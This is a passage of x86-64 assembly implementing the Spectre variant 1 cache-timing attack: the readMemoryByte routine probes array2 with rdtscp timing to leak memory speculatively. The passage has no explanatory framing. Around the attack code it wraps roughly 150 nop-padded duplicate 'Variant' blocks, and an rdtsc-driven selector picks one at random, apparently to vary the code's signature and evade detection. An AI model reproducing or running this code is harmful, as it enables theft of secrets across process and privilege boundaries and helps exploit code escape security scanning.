	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 142
.LreadMemoryByte_win5_var142:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 143
.LreadMemoryByte_win5_var143:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 144
.LreadMemoryByte_win5_var144:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	nop
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 145
.LreadMemoryByte_win5_var145:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 146
.LreadMemoryByte_win5_var146:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 147
.LreadMemoryByte_win5_var147:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 148
.LreadMemoryByte_win5_var148:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 149
.LreadMemoryByte_win5_var149:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
.LreadMemoryByte_win5_continue:
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -112(%rbp)
	leaq	-72(%rbp), %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	movq	%rax, -136(%rbp)    # # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-136(%rbp), %rcx    # # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	movq	%rax, -96(%rbp)
	movq	-112(%rbp), %rax
	movb	(%rax), %al
	movzbl	%al, %eax
	movl	%eax, -72(%rbp)
	leaq	-72(%rbp), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movq	%rax, -128(%rbp)    # # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-128(%rbp), %rcx    # # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	subq	-96(%rbp), %rax
	movq	%rax, -104(%rbp)
	movq	-104(%rbp), %rax
                                        ## kill: def $eax killed $eax killed $rax
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win4_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win4_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win4_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win4_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win4_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win4_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win4_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win4_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win4_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win4_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win4_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win4_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win4_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win4_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win4_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win4_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win4_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win4_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win4_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win4_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win4_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win4_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win4_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win4_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win4_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win4_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win4_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win4_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win4_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win4_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win4_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win4_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win4_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win4_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win4_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win4_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win4_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win4_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win4_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win4_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win4_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win4_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win4_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win4_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win4_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win4_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win4_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win4_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win4_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win4_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win4_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win4_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win4_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win4_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win4_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win4_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win4_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win4_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win4_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win4_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win4_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win4_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win4_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win4_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win4_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win4_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win4_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win4_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win4_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win4_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win4_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win4_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win4_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win4_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win4_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win4_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win4_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win4_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win4_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win4_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win4_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win4_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win4_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win4_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win4_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win4_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win4_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win4_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win4_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win4_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win4_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win4_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win4_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win4_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win4_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win4_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win4_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win4_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win4_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win4_var99
	cmpl	$100, %eax
	je	.LreadMemoryByte_win4_var100
	cmpl	$101, %eax
	je	.LreadMemoryByte_win4_var101
	cmpl	$102, %eax
	je	.LreadMemoryByte_win4_var102
	cmpl	$103, %eax
	je	.LreadMemoryByte_win4_var103
	cmpl	$104, %eax
	je	.LreadMemoryByte_win4_var104
	cmpl	$105, %eax
	je	.LreadMemoryByte_win4_var105
	cmpl	$106, %eax
	je	.LreadMemoryByte_win4_var106
	cmpl	$107, %eax
	je	.LreadMemoryByte_win4_var107
	cmpl	$108, %eax
	je	.LreadMemoryByte_win4_var108
	cmpl	$109, %eax
	je	.LreadMemoryByte_win4_var109
	cmpl	$110, %eax
	je	.LreadMemoryByte_win4_var110
	cmpl	$111, %eax
	je	.LreadMemoryByte_win4_var111
	cmpl	$112, %eax
	je	.LreadMemoryByte_win4_var112
	cmpl	$113, %eax
	je	.LreadMemoryByte_win4_var113
	cmpl	$114, %eax
	je	.LreadMemoryByte_win4_var114
	cmpl	$115, %eax
	je	.LreadMemoryByte_win4_var115
	cmpl	$116, %eax
	je	.LreadMemoryByte_win4_var116
	cmpl	$117, %eax
	je	.LreadMemoryByte_win4_var117
	cmpl	$118, %eax
	je	.LreadMemoryByte_win4_var118
	cmpl	$119, %eax
	je	.LreadMemoryByte_win4_var119
	cmpl	$120, %eax
	je	.LreadMemoryByte_win4_var120
	cmpl	$121, %eax
	je	.LreadMemoryByte_win4_var121
	cmpl	$122, %eax
	je	.LreadMemoryByte_win4_var122
	cmpl	$123, %eax
	je	.LreadMemoryByte_win4_var123
	cmpl	$124, %eax
	je	.LreadMemoryByte_win4_var124
	cmpl	$125, %eax
	je	.LreadMemoryByte_win4_var125
	cmpl	$126, %eax
	je	.LreadMemoryByte_win4_var126
	cmpl	$127, %eax
	je	.LreadMemoryByte_win4_var127
	cmpl	$128, %eax
	je	.LreadMemoryByte_win4_var128
	cmpl	$129, %eax
	je	.LreadMemoryByte_win4_var129
	cmpl	$130, %eax
	je	.LreadMemoryByte_win4_var130
	cmpl	$131, %eax
	je	.LreadMemoryByte_win4_var131
	cmpl	$132, %eax
	je	.LreadMemoryByte_win4_var132
	cmpl	$133, %eax
	je	.LreadMemoryByte_win4_var133
	cmpl	$134, %eax
	je	.LreadMemoryByte_win4_var134
	cmpl	$135, %eax
	je	.LreadMemoryByte_win4_var135
	cmpl	$136, %eax
	je	.LreadMemoryByte_win4_var136
	cmpl	$137, %eax
	je	.LreadMemoryByte_win4_var137
	cmpl	$138, %eax
	je	.LreadMemoryByte_win4_var138
	cmpl	$139, %eax
	je	.LreadMemoryByte_win4_var139
	cmpl	$140, %eax
	je	.LreadMemoryByte_win4_var140
	cmpl	$141, %eax
	je	.LreadMemoryByte_win4_var141
	cmpl	$142, %eax
	je	.LreadMemoryByte_win4_var142
	cmpl	$143, %eax
	je	.LreadMemoryByte_win4_var143
	cmpl	$144, %eax
	je	.LreadMemoryByte_win4_var144
	cmpl	$145, %eax
	je	.LreadMemoryByte_win4_var145
	cmpl	$146, %eax
	je	.LreadMemoryByte_win4_var146
	cmpl	$147, %eax
	je	.LreadMemoryByte_win4_var147
	cmpl	$148, %eax
	je	.LreadMemoryByte_win4_var148
	cmpl	$149, %eax
	je	.LreadMemoryByte_win4_var149
	jmp	.LreadMemoryByte_win4_var0
## Variant 0
.LreadMemoryByte_win4_var0:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 1
.LreadMemoryByte_win4_var1:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 2
.LreadMemoryByte_win4_var2:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 3
.LreadMemoryByte_win4_var3:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 4
.LreadMemoryByte_win4_var4:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 5
.LreadMemoryByte_win4_var5:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 6
.LreadMemoryByte_win4_var6:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 7
.LreadMemoryByte_win4_var7:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 8
.LreadMemoryByte_win4_var8:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 9
.LreadMemoryByte_win4_var9:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 10
.LreadMemoryByte_win4_var10:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 11
.LreadMemoryByte_win4_var11:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 12
.LreadMemoryByte_win4_var12:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 13
.LreadMemoryByte_win4_var13:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 14
.LreadMemoryByte_win4_var14:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 15
.LreadMemoryByte_win4_var15:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 16
.LreadMemoryByte_win4_var16:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 17
.LreadMemoryByte_win4_var17:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 18
.LreadMemoryByte_win4_var18:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 19
.LreadMemoryByte_win4_var19:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 20
.LreadMemoryByte_win4_var20:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 21
.LreadMemoryByte_win4_var21:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 22
.LreadMemoryByte_win4_var22:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	nop
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 23
.LreadMemoryByte_win4_var23:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 24
.LreadMemoryByte_win4_var24:
	popq	%rax
	nop
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 25
.LreadMemoryByte_win4_var25:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 26
.LreadMemoryByte_win4_var26:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 27
.LreadMemoryByte_win4_var27:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 28
.LreadMemoryByte_win4_var28:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 29
.LreadMemoryByte_win4_var29:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 30
.LreadMemoryByte_win4_var30:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 31
.LreadMemoryByte_win4_var31:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 32
.LreadMemoryByte_win4_var32:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 33
.LreadMemoryByte_win4_var33:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 34
.LreadMemoryByte_win4_var34:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 35
.LreadMemoryByte_win4_var35:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
